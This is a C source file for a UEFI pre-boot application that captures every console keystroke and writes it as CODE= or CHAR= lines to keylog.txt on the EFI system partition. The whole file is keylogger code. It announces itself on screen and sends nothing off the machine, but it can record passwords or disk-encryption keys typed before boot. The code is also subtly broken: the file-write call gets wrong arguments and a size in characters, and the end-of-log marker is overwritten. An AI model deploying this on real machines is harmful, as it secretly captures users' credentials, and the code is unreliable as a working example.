#include <efi.h>
#include <efilib.h>
#include <string.h>

EFI_STATUS status;
EFI_FILE_PROTOCOL *Root;
EFI_FILE_PROTOCOL *File;
EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *SimpleFileSystem;
const CHAR16 *FileName = L"\\keylog.txt";
int Terminate = 0;

void s_write_data(CHAR16 *data)
{
    UINTN size = StrLen(data);
    status = uefi_call_wrapper(File->Write, 3, File, size, &data);
    if (status != 0) {
        Print(L"Unable to write to file\n");
        Terminate = 1;
    }
}

void s_open_file()
{
    status = uefi_call_wrapper(BS->LocateProtocol, 3, &gEfiSimpleFileSystemProtocolGuid, NULL, (void **)&SimpleFileSystem);
    if (EFI_ERROR(status)) {
        Print(L"Unable to locate Simple File System Protocol\n");
    }

    // Open the volume
    status = uefi_call_wrapper(SimpleFileSystem->OpenVolume, 2, SimpleFileSystem, &Root);
    if (EFI_ERROR(status)) {
        Print(L"Unable to open volume\n");
    }

    // Create or open the file
    status = uefi_call_wrapper(Root->Open, 5, Root, &File, FileName, EFI_FILE_MODE_CREATE | EFI_FILE_MODE_WRITE | EFI_FILE_MODE_READ, 0);
    if (EFI_ERROR(status)) {
        Print(L"Unable to open file\n");
    }

    s_write_data(L"Start Of Log");

}



void s_process_key(EFI_INPUT_KEY Key) {

    // put in file as either CODE=<code>
    // or CHAR=<char> followed by newline
    // if code != 0, put code & no char
    // otherwise put char
    
    CHAR16 *buffer;
    CHAR16 numStr[5]; // Buffer to hold the string representation of the number

    if (Key.ScanCode != 0) {
        buffer = (CHAR16 *)AllocatePool(50 * sizeof(CHAR16)); // Allocate more memory
        if (buffer == NULL) {
            return; // Handle memory allocation failure
        }

        // check for ESCAPE
        if (Key.ScanCode == 23)
        {
            StrCpy(buffer, L"End Of Log\n");
            Terminate = 1;
        }

        StrCpy(buffer, L"CODE=");
        UnicodeSPrint(numStr, sizeof(numStr), L"%d", Key.ScanCode); // Convert ScanCode to string
        StrCat(buffer, numStr);
        StrCat(buffer, L"\n");
    } else {
        buffer = (CHAR16 *)AllocatePool(50 * sizeof(CHAR16)); // Allocate more memory
        if (buffer == NULL) {
            return; // Handle memory allocation failure
        }

        StrCpy(buffer, L"CHAR=");

        if (Key.UnicodeChar == 0x0D) { // newline
            StrCat(buffer, L"RET");
        } else if (Key.UnicodeChar == 0x7F) { // delete
            StrCat(buffer, L"DEL");
        } else if (Key.UnicodeChar == 0x08) { // backspace
            StrCat(buffer, L"BSP");
        } else {
            UnicodeSPrint(numStr, sizeof(numStr), L"%c", Key.UnicodeChar); // Convert UnicodeChar to string
            StrCat(buffer, numStr);
        }
        StrCat(buffer, L"\n");
    }

    s_write_data(buffer);
    FreePool(buffer);
}

void s_close_file()
{
    uefi_call_wrapper(File->Close, 1, File);
}

EFI_STATUS
EFIAPI
efi_main(EFI_HANDLE imageHandle, EFI_SYSTEM_TABLE *systemTable)
{
    InitializeLib(imageHandle, systemTable);

    Print(L"Hello, World!\n");
    Print(L"Opening file...\n");
    s_open_file();
    Print(L"Done! Keystrokes will now be saved to esp/keylog.txt...\n");

    // Wait for a key press
    EFI_INPUT_KEY key;
    uefi_call_wrapper(systemTable->ConIn->Reset, 2, systemTable->ConIn, FALSE);

    
    while (1) {
        if(Terminate)
        {
            s_close_file();
            break;
        }

        EFI_STATUS status = uefi_call_wrapper(systemTable->ConIn->ReadKeyStroke, 2, systemTable->ConIn, &key);
        if (status == EFI_SUCCESS) {
            Print(L"Key pressed: ScanCode=%d, UnicodeChar=%c\n", key.ScanCode, key.UnicodeChar);
            s_process_key(key);
        }
    }

    return EFI_SUCCESS;
}